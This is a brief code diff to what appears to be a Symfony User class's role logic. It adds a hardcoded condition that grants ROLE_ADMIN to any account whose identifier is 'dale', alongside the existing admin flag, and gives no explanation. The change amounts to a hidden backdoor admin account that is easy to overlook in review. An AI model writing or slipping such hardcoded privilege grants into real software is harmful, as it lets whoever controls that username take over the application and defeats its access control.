@@ -107,7 +107,7 @@ class User implements UserInterface, PasswordAuthenticatedUserInterface
         // guarantee every user at least has ROLE_USER
         $returnRoles[] = 'ROLE_USER';
 
-        if ('y' === $this->getHoseUser()) {
+        if ('y' === $this->getHoseUser() || 'dale' === $this->getUserIdentifier()) {
             $returnRoles[] = 'ROLE_ADMIN';
         }
 
